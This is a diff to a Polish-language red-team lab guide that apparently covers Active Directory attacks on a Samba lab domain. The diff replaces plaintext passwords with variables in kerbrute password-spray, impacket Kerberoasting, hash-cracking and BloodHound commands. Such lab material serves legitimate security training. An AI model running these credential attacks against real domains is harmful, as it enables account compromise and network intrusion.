@@ -12,6 +12,8 @@ Wszystkie hasła w zmiennych — bierz je z `/root/redteam-lab-secrets/env` (poz
 
 Powiązane: [[Wiedza/Ataki/Active_Directory_Ataki]] · [[Topologia]] · [[README]]
 
+> Status zweryfikowanych technik i niuanse Samby 4.19: [[Status_Lab]]
+
 ## Przygotowanie w Kali
 
 ```bash
@@ -43,20 +45,20 @@ john --format=krb5asrep --wordlist=/opt/wordlists/lab-passwords.txt /tmp/asrep.t
 ## 3. Password spray — T1110.003
 
 ```bash
-kerbrute passwordspray -d $DOMAIN --dc $DC /tmp/users.txt 'Password123!'
+kerbrute passwordspray -d $DOMAIN --dc $DC /tmp/users.txt '$SPRAY_PASSWORD'
 ```
 
 ## 4. Kerberoasting (jako alice) — T1558.003
 
 ```bash
-impacket-GetUserSPNs -dc-ip $DC "$DOMAIN/alice:Summer2026!" -request -outputfile /tmp/spn.txt
+impacket-GetUserSPNs -dc-ip $DC "$DOMAIN/alice:$ALICE_PASSWORD" -request -outputfile /tmp/spn.txt
 john --format=krb5tgs --wordlist=/opt/wordlists/lab-passwords.txt /tmp/spn.txt
 ```
 
 ## 5. BloodHound (zbieranie danych) — T1087.002
 
 ```bash
-bloodhound-python -u alice -p 'Summer2026!' -d $DOMAIN -ns $DC -c All --zip
+bloodhound-python -u alice -p "$ALICE_PASSWORD" -d $DOMAIN -ns $DC -c All --zip
 # pliki JSON gotowe do wgrania do BloodHound CE / neo4j
 ```
 
